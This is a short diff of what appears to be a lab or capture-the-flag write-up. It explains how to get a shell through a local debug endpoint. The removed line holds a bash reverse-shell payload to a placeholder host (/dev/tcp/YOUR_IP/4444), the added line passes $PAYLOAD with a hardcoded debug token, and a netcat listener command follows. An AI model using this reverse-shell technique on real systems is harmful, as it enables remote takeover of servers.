@@ -68,7 +68,7 @@ DEBUG_ENDPOINT = "/api/debug"
 ENV = "development"
 ```
 
-You can get a shell with the url http://localhost:5042/api/debug?cmd=bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261 2>%261
+You can get a shell with the url http://localhost:5042/api/debug\?cmd=$PAYLOAD\&token=h4l_d3bug_t0k3n_2024 
 after starting a netcat listener on your side
 ```
 nc -lvnp 4444
